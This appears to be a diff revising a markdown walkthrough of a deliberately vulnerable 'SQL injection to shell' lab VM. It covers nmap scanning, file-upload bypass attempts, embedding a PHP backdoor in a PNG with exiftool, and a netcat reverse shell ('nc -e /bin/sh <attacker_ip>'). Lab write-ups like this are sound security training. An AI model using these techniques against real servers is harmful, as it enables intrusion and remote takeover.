@@ -1,6 +1,5 @@
-
-
-# Walkthrough FROM SQL INJECTION TO SHELL II
+# Blind SQLi to Shell II
+## _Walkthrough_
 
 The first thing to do is to deploy the iso, I used VMWare, and get the ip (using the command __ifconfig__).
 
@@ -14,7 +13,10 @@ The first thing to do is to deploy the iso, I used VMWare, and get the ip (using
 ### Tecnologies used:
 
 ```
-nmap -sC -sV 192.168.77.128
+nmap -sC -sV 192.168.77.128 -p-
+
+-sV check services and versions
+-sC script scan
 ```
   **Output:**
 ```
@@ -23,11 +25,6 @@ nmap -sC -sV 192.168.77.128
 |_http-title: My Photoblog - latest picture
 
 ```
-
-1. NGINX 0.7.67
-2. PHP/5.3.3-7+squeeze15
-
-
 ```
 HTTP/1.1 200 OK
 Server: nginx/0.7.67
@@ -36,8 +33,13 @@ Content-Type: text/html
 Connection: close
 X-Powered-By: PHP/5.3.3-7+squeeze15
 Content-Length: 1347
-
 ```
+### Technologies Used
+
+
+##### NGINX 0.7.67
+##### PHP/5.3.3-7+squeeze15
+
 
 ## Attack method
 
@@ -98,12 +100,12 @@ Table: users
 ### Upload png file with php backdoor
 
 **Things I try without success:**
-
-1. Bypass uploads rules by intercepting the request and change the content-type to __image/jpeg__ 
+1. Just uploading .php file instead of jpg file
+2. Tried Case sensitives — pic.PhP also tried pic.php5, pHP5.
+3. Bypass uploads rules by intercepting the request and change the content-type to __image/jpeg__ 
 (https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)
 
-2. Rename the image from file.php to file.php.png
-
+4. Trying double extensions to bypass and upload php file image.jpg.php or image.php.jpg
 
 ## Final method
 
@@ -134,7 +136,7 @@ Explanation of the code:
 **Using exiftool we are going to add a comment with our payload o the image**
 
 ```
-exiftool exiftool "-comment<=file.php" backdoor.png
+exiftool "-comment<=file.php" backdoor.png
 ```
 
 We are now ready to upload our backdoor and generate a reverse shell.
@@ -151,8 +153,12 @@ __We need to add cmd.php, otherwise the photo is displayed instead of the code w
 To create a reverse shell we use the following code instead of __ls__:
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
 
+Attackers machine:
+```
+nc -lvp 1234
+```
+
+Command cmd=
 ```
 nc -e /bin/sh <attacker_ip> <nc_listener_port>
 ```
-
-
